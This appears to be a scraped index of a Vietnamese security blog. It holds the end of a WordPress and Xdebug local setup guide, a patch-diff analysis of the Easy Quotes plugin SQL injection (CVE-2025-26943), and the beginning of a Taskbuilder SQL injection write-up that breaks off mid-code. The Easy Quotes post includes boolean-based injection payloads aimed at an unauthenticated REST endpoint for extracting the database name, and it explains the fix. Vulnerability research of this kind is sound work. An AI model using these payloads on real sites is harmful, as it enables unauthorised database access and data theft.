cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- LÃ m má»›i láº¡i quyá»n mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- ThoÃ¡t mysql\u0026gt; quit Bye Khá»Ÿi Ä‘á»™ng láº¡i dá»‹ch vá»¥:\nsudo service mysql start Configure WordPress to connect to the database Copy file cáº¥u hÃ¬nh máº«u:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi táº£i vá» cÃ³ sáºµn file wp-config-sample.php Báº¡n copy nÃ³ thÃ nh wp-config.php Ä‘á»ƒ lÃ m file cáº¥u hÃ¬nh chÃ­nh cho site Chá»‰nh sá»­a thÃ´ng tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php ÄÃ¢y lÃ  3 dÃ²ng thay tháº¿ text trong file wp-config.php: database_name_here =\u0026gt; wordpress (tÃªn DB Ä‘Ã£ táº¡o á»Ÿ bÆ°á»›c trÆ°á»›c) username_here =\u0026gt; wordpress (user MySQL Ä‘Ã£ táº¡o) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password Ä‘Ã£ set) Khi Apache cháº¡y WordPress, nÃ³ sáº½ Ä‘á»c file nÃ y Ä‘á»ƒ biáº¿t dÃ¹ng user nÃ o + DB nÃ o Ä‘á»ƒ káº¿t ná»‘i MySQL ThÃªm Secret Keys vÃ  Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php ğŸ‘‰ ÄÃ¢y lÃ  chuá»—i bÃ­ máº­t mÃ  WordPress dÃ¹ng Ä‘á»ƒ:\nMÃ£ hÃ³a session cookies Sinh ra token (nonce) chá»‘ng CSRF NgÄƒn cháº·n táº¥n cÃ´ng kiá»ƒu â€œknown secretâ€ (vÃ­ dá»¥ káº» táº¥n cÃ´ng Ä‘oÃ¡n Ä‘Æ°á»£c secret máº·c Ä‘á»‹nh Ä‘á»ƒ giáº£ máº¡o login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay Ä‘á»•i nÃ³ báº±ng cÃ¡c chuá»—i random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy cáº­p http://localhost, Ä‘áº·t site title, username, password, email cho user admin\nSetup Debug on VSCode Äá»ƒ hiá»ƒu Ä‘Æ°á»£c luá»“ng cá»§a trang web cháº¡y vÃ  xá»­ lÃ­ á»Ÿ má»—i request, ta cáº§n pháº£i debug nÃ³.\nAdd PHP Debug extension on VS Code VÃ o Extensions (Ctrl+Shift+X) =\u0026gt; tÃ¬m PHP Debug (by Felix Becker) =\u0026gt; Install. Extension nÃ y káº¿t ná»‘i vá»›i Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Kiá»ƒm tra cÃ i chÆ°a:\nphp -v Náº¿u cÃ³ dÃ²ng with Xdebug v3.x.x nghÄ©a lÃ  Ä‘Ã£ OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini ThÃªm vÃ o cuá»‘i file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port máº·c Ä‘á»‹nh má»›i cá»§a Xdebug v3 lÃ  9003.\nSau Ä‘Ã³ restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json Má»Ÿ thÆ° má»¥c chá»©a trang web wordpress báº±ng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; táº¡o file launch.json vá»›i ná»™i dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: Ã¡nh xáº¡ thÆ° má»¥c trong container/server (/srv/www/wordpress) vá» thÆ° má»¥c local cá»§a trong VS Code.\nNhÆ° váº­y lÃ  Ä‘Ã£ hoÃ n thÃ nh setup WordPress trÃªn local káº¿t há»£p Debug nÃ³ trÃªn VSCode.\nExtend Required Version Má»—i phiÃªn báº£n WordPress thÆ°á»ng Ä‘i kÃ¨m 1 phiÃªn báº£n PHP thÃ­ch há»£p. NÃªn kiá»ƒm tra tÃ­nh tÆ°Æ¡ng thÃ­ch nÃ y Ä‘á»ƒ quÃ¡ trÃ¬nh setup khÃ´ng bá»‹ lá»—i.\nWordPress Auto Update Tá»« WordPress 3.7 trá»Ÿ Ä‘i (2013), WordPress cÃ³ cÆ¡ cháº¿ tá»± Ä‘á»™ng cáº­p nháº­t (automatic background updates) cho:\nBáº£n vÃ¡ báº£o máº­t (security release). Báº£n báº£o trÃ¬ (maintenance release). KhÃ´ng tá»± Ä‘á»™ng update major version (trá»« khi báº­t rÃµ rÃ ng). Há»‡ thá»‘ng kiá»ƒm tra vá»›i server api.wordpress.org Ä‘á»ƒ xem cÃ³ báº£n vÃ¡ nÃ o má»›i sáº½ tá»± Ä‘á»™ng nÃ¢ng cáº¥p background lÃªn. Viá»‡c nÃ y diá»…n ra ráº¥t nhanh sau khi setup, nÃªn báº¡n tháº¥y code Ä‘á»•i khÃ¡c so vá»›i source gá»‘c.\nQuÃ¡ trÃ¬nh setup diá»…n ra khi truy cáº­p /wp-admin/install.php\nÄá»ƒ vÃ´ hiá»‡u hÃ³a cÆ¡ cháº¿ cáº­p nháº­t tá»± Ä‘á»™ng nÃ y, thÃªm dÃ²ng sau vÃ o wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size Máº·c Ä‘á»‹nh, WordPress phá»¥ thuá»™c vÃ o cáº¥u hÃ¬nh PHP (upload_max_filesize, post_max_size, vÃ  Ä‘Ã´i khi cáº£ max_execution_time) Ä‘á»ƒ xÃ¡c Ä‘á»‹nh dung lÆ°á»£ng file tá»‘i Ä‘a cÃ³ thá»ƒ upload. TrÃªn nhiá»u hosting, giá»›i háº¡n nÃ y chá»‰ khoáº£ng 2MB â€“ 8MB, khÃ´ng Ä‘á»§ cho cÃ¡c plugin hiá»‡n Ä‘áº¡i.\nWhy Increase the Limit? Plugin dung lÆ°á»£ng lá»›n: CÃ¡c plugin nhÆ° WooCommerce extension, page builder, backup, hoáº·c security suite cÃ³ thá»ƒ náº·ng 20MB â€“ 100MB.\nTrÃ¡nh lá»—i upload: Náº¿u file .zip lá»›n hÆ¡n giá»›i háº¡n, báº¡n sáº½ gáº·p lá»—i:\nâ€œThe uploaded file exceeds the upload_max_filesize directive in php.iniâ€ Hoáº·c upload tháº¥t báº¡i. Thuáº­n tiá»‡n cho quáº£n trá»‹ viÃªn: CÃ³ thá»ƒ cÃ i trá»±c tiáº¿p qua Dashboard mÃ  khÃ´ng cáº§n FTP/SSH.\nHá»— trá»£ phÃ¡t triá»ƒn plugin: Plugin tá»± viáº¿t kÃ¨m nhiá»u thÆ° viá»‡n/asset cÃ³ thá»ƒ khÃ¡ náº·ng, viá»‡c tÄƒng giá»›i háº¡n giÃºp test dá»… dÃ ng hÆ¡n.\nHow to Increase Plugin Upload Size Sá»­a php.ini (náº¿u cÃ³ quyá»n server):\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 Sá»­a file .htaccess (náº¿u dÃ¹ng Apache):\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 ThÃªm vÃ o wp-config.php:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); ğŸ‘‰ Lá»i khuyÃªn: Chá»‰ nÃªn Ä‘áº·t giá»›i háº¡n vá»«a Ä‘á»§ (64MB hoáº·c 128MB). TrÃ¡nh Ä‘áº·t quÃ¡ lá»›n Ä‘á»ƒ háº¡n cháº¿ nguy cÆ¡ bá»‹ upload file náº·ng gÃ¢y quÃ¡ táº£i server.\n","permalink":"//localhost:1313/vi/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e lÃ  má»™t há»‡ thá»‘ng quáº£n lÃ½ ná»™i dung (CMS) máº¡nh máº½ vÃ  phá»• biáº¿n nháº¥t cho phÃ©p báº¡n táº¡o, quáº£n lÃ½ vÃ  tÃ¹y chá»‰nh cÃ¡c trang web vÃ  blog má»™t cÃ¡ch dá»… dÃ ng. NÃ³ lÃ  open-source CMS, Ä‘Æ°á»£c xÃ¢y dá»±ng trÃªn PHP vÃ  sá»­ dá»¥ng cÆ¡ sá»Ÿ dá»¯ liá»‡u MySQL hoáº·c Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa Ä‘á»i nÄƒm 2003, ban Ä‘áº§u chá»‰ Ä‘á»ƒ viáº¿t blog, sau Ä‘Ã³ phÃ¡t triá»ƒn thÃ nh ná»n táº£ng táº¡o website, cá»­a hÃ ng online, diá»…n Ä‘Ã n, landing pageâ€¦\u003c/li\u003e\n\u003cli\u003eHiá»‡n nay, hÆ¡n 40% website trÃªn tháº¿ giá»›i cháº¡y báº±ng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eCÃ³ 2 phiÃªn báº£n WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Lá»— há»•ng xáº£y ra trÃªn plugin Easy Quotes cá»§a WordPress trÆ°á»›c phiÃªn báº£n 1.2.3. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\nCVE ID: CVE-2025-26943 Product: WordPress Easy Quotes Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.2.2 CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Taskbuilder Plugin: v1.2.2(vul) vÃ  v1.2.3(fix) diff tool: meld hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version Analysis á»¨ng dá»¥ng Ä‘Ã£ Ä‘Æ°a trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u query SQL mÃ  khÃ´ng sá»­ dá»¥ng cÃ¡c biá»‡n phÃ¡p báº£o vá»‡ khiáº¿n lá»— há»•ng SQL Injection xáº£y ra.\nPatch Diff DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡. CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file includes/quotes-data.php\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } Báº£n vÃ¡ sá»­ dá»¥ng $wpdb-\u0026gt;prepare() thay vÃ¬ truyá»n trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u query.\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT * FROM %i WHERE `family` = %s\u0026#34;, $tablename, $family ); return $wpdb-\u0026gt;get_row($sql); } CÃ³ nhiá»u hÃ m cÅ©ng Ä‘Æ°á»£c vÃ¡ báº±ng cÃ¡ch trÃªn, nhÆ°: get_font_variant($family_id, $variant_id), get_font_variants($family), get_fonts($category = -1)\nTuy get_fonts_categories() Ä‘Ã£ Ä‘Æ°á»£c vÃ¡ nhÆ°ng nÃ³ khÃ´ng chá»©a dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng, nÃªn khÃ´ng cáº§n quan tÃ¢m\npublic static function get_fonts_categories() { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-categories\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT `category_id`, `category` FROM %i\u0026#34;, $tablename ); return $wpdb-\u0026gt;get_results($sql); } How it work? Ta khai thÃ¡c lá»—i SQL Injection trong hÃ m get_family_data($family), cÃ¡c hÃ m cÃ²n láº¡i khai thÃ¡c tÆ°Æ¡ng tá»±.\nget_family_data() lÃ  hÃ m public trong class Quotes_Data\nclass Quotes_Data { function __construct() { add_filter(\u0026#39;posts_where\u0026#39;, array($this, \u0026#39;posts_where\u0026#39;), 10, 2); } // other function public static function get_font_variants($family) { $familyData = self::get_family_data($family); // other logic } public static function get_family($family, $variant_id) { $family_data = (array)self::get_family_data($family); // other logic } private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } } get_family_data() Ä‘Æ°á»£c gá»i trong 2 hÃ m get_family() vÃ  get_font_variants() cá»§a class Quotes_Data, Ä‘á»ƒ biáº¿t chÃºng sá»­ dá»¥ng á»Ÿ Ä‘Ã¢u, ta tÃ¬m kiáº¿n vá»›i tá»« khÃ³a get_family hoáº·c get_font_variants\nHÃ m get_font_variants() Ä‘Æ°á»£c gá»i trong hÃ m rest_route_callback_font_variants() cá»§a class Quotes_Rest_Route\nclass Quotes_Rest_Route { function __construct() { add_action(\u0026#39;rest_api_init\u0026#39;, array($this, \u0026#39;rest_api_init\u0026#39;)); } /** * Register my REST route * * @return void */ function rest_api_init($wp_rest_server) { $args = [ \u0026#39;method\u0026#39; =\u0026gt; WP_REST_Server::READABLE, \u0026#39;callback\u0026#39; =\u0026gt; [$this, \u0026#39;rest_route_callback_quote\u0026#39;], \u0026#39;permission_callback\u0026#39; =\u0026gt; \u0026#39;__return_true\u0026#39; ]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/quote\u0026#39;, $args); // other logic $args[\u0026#39;callback\u0026#39;] = [$this, \u0026#39;rest_route_callback_font_variants\u0026#39;]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/font-variants\u0026#39;, $args); } // other function function rest_route_callback_font_variants(WP_REST_Request $request) { $family = $request-\u0026gt;get_param(\u0026#39;family\u0026#39;); $family = isset($family) ? $family : \u0026#34;Shadows Into Light\u0026#34;; $response = Quotes_Data::get_font_variants($family); return rest_ensure_response($response); } } HÃ m khá»Ÿi táº¡o cá»§a class Quotes_Rest_Route sá»­ dá»¥ng add_action(hook_name, callback) vá»›i hook_name lÃ  rest_api_init Ä‘á»ƒ Ä‘Äƒng kÃ½ cÃ¡c endpoint tÃ¹y chá»‰nh vá»›i REST API System cá»§a WordPress\nCallback rest_api_init sá»­ dá»¥ng register_rest_route nhiá»u láº§n Ä‘á»ƒ táº¡o cÃ¡c endpoint dÆ°á»›i namespace layart/v1\nrest_route_callback_font_variants lÃ  callback cá»§a endpoint /wp-json/layart/v1/font-variants?family=family_name\n$family máº·c Ä‘á»‹nh lÃ  Shadows Into Light náº¿u khÃ´ng Ä‘Æ°á»£c truyá»n trong param.\nExploit Detect SQLi Ta thá»­ ká»¹ thuáº­t Boolean-based SQL Injection Ä‘á»ƒ kiá»ƒm tra xem tham sá»‘ family cÃ³ dá»… bá»‹ chÃ¨n lá»‡nh SQL hay khÃ´ng.\nTrue request: Khi Ä‘Ã³, cÃ¢u query thá»±c thi sáº½ trá»Ÿ thÃ nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;\u0026#34; Äiá»u kiá»‡n AND '1'='1' luÃ´n Ä‘Ãºng =\u0026gt; query há»£p lá»‡, tráº£ vá» dá»¯ liá»‡u bÃ¬nh thÆ°á»ng.\nFalse request: Khi Ä‘Ã³, cÃ¢u query thá»±c thi sáº½ trá»Ÿ thÃ nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;2\u0026#39;\u0026#34; Äiá»u kiá»‡n AND '1'='2' luÃ´n sai =\u0026gt; query khÃ´ng khá»›p =\u0026gt; tráº£ vá» [].\nGet First Letter of Database Name Äiá»u kiá»‡n tiÃªn quyáº¿t Ä‘á»ƒ dump Ä‘Æ°á»£c háº¿t data lÃ  pháº£i dump Ä‘Æ°á»£c 1 kÃ½ tá»± báº¥t ká»³ cá»§a tÃªn database, náº¿u láº¥y Ä‘Æ°á»£c thÃ¬ toÃ n bá»™ data Ä‘á»u dump Ä‘Æ°á»£c.\nDatabase name Ä‘Æ°á»£c tÃ´i Ä‘áº·t tÃªn lÃ  wordpress nÃªn kÃ­ tá»± Ä‘áº§u tiÃªn lÃ  w\nResponse tráº£ vá» dá»¯ liá»‡u bÃ¬nh thÆ°á»ng =\u0026gt; kÃ­ tá»± Ä‘áº§u tiÃªn lÃ  w\nKhi Ä‘Ã³, cÃ¢u query thá»±c thi sáº½ trá»Ÿ thÃ nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+SUBSTRING(DATABASE(),1,1)=\u0026#39;w\u0026#39;\u0026#34; Conclusion Lá»— há»•ng CVE-2025-26943 trong plugin WordPress Easy Quotes trÆ°á»›c phiÃªn báº£n 1.2.3 xuáº¥t phÃ¡t tá»« viá»‡c khÃ´ng sá»­ dá»¥ng cÆ¡ cháº¿ chuáº©n bá»‹ truy váº¥n ($wpdb-\u0026gt;prepare) mÃ  truyá»n trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u lá»‡nh SQL dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\nBáº£n vÃ¡ chÃ­nh thá»©c Ä‘Ã£ thay tháº¿ viá»‡c ná»‘i chuá»—i báº±ng cÃ¡ch dÃ¹ng $wpdb-\u0026gt;prepare, giÃºp Ä‘áº£m báº£o dá»¯ liá»‡u Ä‘áº§u vÃ o Ä‘Æ°á»£c kiá»ƒm soÃ¡t vÃ  an toÃ n hÆ¡n.\nKey takeaways:\nLuÃ´n sá»­ dá»¥ng $wpdb-\u0026gt;prepare() khi lÃ m viá»‡c vá»›i database trong WordPress Ä‘á»ƒ trÃ¡nh SQL Injection. ThÆ°á»ng xuyÃªn cáº­p nháº­t plugin vÃ  kiá»ƒm tra báº£o máº­t Ä‘á»ƒ trÃ¡nh trá»Ÿ thÃ nh má»¥c tiÃªu táº¥n cÃ´ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Easy Quotes Plugin \u0026lt;= 1.2.2 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-23-cve-2025-26943/","summary":"\u003cp\u003eLá»— há»•ng xáº£y ra trÃªn plugin \u003cstrong\u003eEasy Quotes\u003c/strong\u003e cá»§a WordPress trÆ°á»›c phiÃªn báº£n \u003cstrong\u003e1.2.3\u003c/strong\u003e. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-26943\"\u003eCVE-2025-26943\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/easy-quotes/#description\"\u003eWordPress Easy Quotes Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.2.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (9.3)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v1.2.2(vul) vÃ  v1.2.3(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eá»¨ng dá»¥ng Ä‘Ã£ Ä‘Æ°a trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u query SQL mÃ  \u003cstrong\u003ekhÃ´ng sá»­ dá»¥ng cÃ¡c biá»‡n phÃ¡p báº£o vá»‡\u003c/strong\u003e khiáº¿n lá»— há»•ng SQL Injection xáº£y ra.\u003c/p\u003e","title":"CVE-2025-26943"},{"content":"Lá»— há»•ng xáº£y ra trÃªn plugin Taskbuilder cá»§a WordPress trÆ°á»›c phiÃªn báº£n 4.0.2. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\nCVE ID: CVE-2025-39569 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 4.0.2 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Taskbuilder Plugin: v4.0.1(vul) vÃ  v4.0.2(fix) diff tool: meld hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version Analysis á»¨ng dá»¥ng Ä‘Ã£ xá»­ lÃ½ dá»¯ liá»‡u Ä‘áº§u vÃ o trÆ°á»›c khi Ä‘Æ°a vÃ o cÃ¢u SQL. Tuy nhiÃªn, trong quÃ¡ trÃ¬nh xÃ¢y dá»±ng truy váº¥n, giÃ¡ trá»‹ nÃ y Ä‘Æ°á»£c chÃ¨n trá»±c tiáº¿p mÃ  khÃ´ng Ä‘Æ°á»£c bao trong dáº¥u nhÃ¡y Ä‘Æ¡n '...'. Äiá»u Ä‘Ã³ khiáº¿n káº» táº¥n cÃ´ng cÃ³ thá»ƒ chÃ¨n thÃªm cÃ¡c thÃ nh pháº§n cÃº phÃ¡p SQL há»£p lá»‡ (nhÆ° OR, AND,...) vÃ o truy váº¥n, dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\nPatch Diff DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡. CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file includes/admin/projects/get_users.php\nTrong phiÃªn báº£n v4.0.1, biáº¿n $proj_id sau khi escape Ä‘Æ°á»£c Ä‘Æ°a tháº³ng vÃ o cÃ¢u truy váº¥n mÃ  khÃ´ng cÃ³ dáº¥u nhÃ¡y Ä‘Æ¡n bao quanh:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = $proj_id\u0026#34; ); á» báº£n v4.0.2, truy váº¥n Ä‘Ã£ Ä‘Æ°á»£c Ä‘iá»u chá»‰nh báº±ng cÃ¡ch Ä‘áº·t $proj_id trong dáº¥u nhÃ¡y Ä‘Æ¡n sau khi escape:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = \u0026#39;$proj_id\u0026#39;\u0026#34; ); Báº£n vÃ¡ nÃ y Ä‘áº£m báº£o ráº±ng giÃ¡ trá»‹ $proj_id sau khi escape Ä‘Æ°á»£c coi lÃ  má»™t chuá»—i literal, khÃ´ng thá»ƒ thoÃ¡t ra khá»i dáº¥u nhÃ¡y Ä‘Æ¡n Ä‘á»ƒ chÃ¨n thÃªm cÃº phÃ¡p SQL, qua Ä‘Ã³ ngÄƒn cháº·n táº¥n cÃ´ng SQL Injection.\nHow it work? File architecture:\nCáº¥u trÃºc chung cá»§a file hiá»‡n táº¡i\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project WHERE id = $proj_id\u0026#34;); // Báº¯t Ä‘áº§u buffer Ä‘á»ƒ táº¡o ná»™i dung chÃ­nh (body) cá»§a modal ob_start(); // ... render HTML danh sÃ¡ch users $body = ob_get_clean(); // Báº¯t Ä‘áº§u buffer Ä‘á»ƒ táº¡o pháº§n footer cá»§a modal ob_start(); // ... render HTML cÃ¡c nÃºt thao tÃ¡c (Close, Save) $footer = ob_get_clean(); // Tráº£ dá»¯ liá»‡u JSON Ä‘á»ƒ frontend hiá»ƒn thá»‹ modal echo json_encode([ \u0026#39;body\u0026#39; =\u0026gt; $body, \u0026#39;footer\u0026#39; =\u0026gt; $footer, ]); $proj_id / $project: Láº¥y dá»¯ liá»‡u project tá»« database. ob_start() / ob_get_clean(): Ghi HTML ra buffer thay vÃ¬ xuáº¥t trá»±c tiáº¿p, giÃºp gom ná»™i dung vÃ o biáº¿n. $body / $footer: Chá»©a ná»™i dung HTML Ä‘á»™ng cá»§a modal. json_encode(): Tráº£ JSON cho client, cÃ³ kháº£ nÄƒng Ä‘Æ°á»£c sá»­ dá»¥ng trong Ajax Ä‘á»ƒ hiá»ƒn thá»‹ modal mÃ  khÃ´ng cáº§n refresh trang. File náº±m trong thÆ° má»¥c includes cho tháº¥y ráº±ng nÃ³ sáº½ Ä‘Æ°á»£c gá»i á»Ÿ 1 chá»©c nÄƒng nÃ o Ä‘Ã³ á»Ÿ nÆ¡i khÃ¡c. Äá»ƒ biáº¿t chá»©c nÄƒng nÃ o sá»­ dá»¥ng nÃ³, ta tÃ¬m kiáº¿m vá»›i tá»« khÃ³a get_users.php trong thÆ° má»¥c chá»©a plugin.\nğŸ‘‰ NÃ³ Ä‘Æ°á»£c include trong hÃ m wppm_get_users() cá»§a class WPPM_Admin trong file class-wppm-admin.php. wppm_get_users() lÃ  callback cá»§a action hook trong WordPress.\nWPPM_Admin construct:\nfinal class WPPM_Admin { // constructor public function 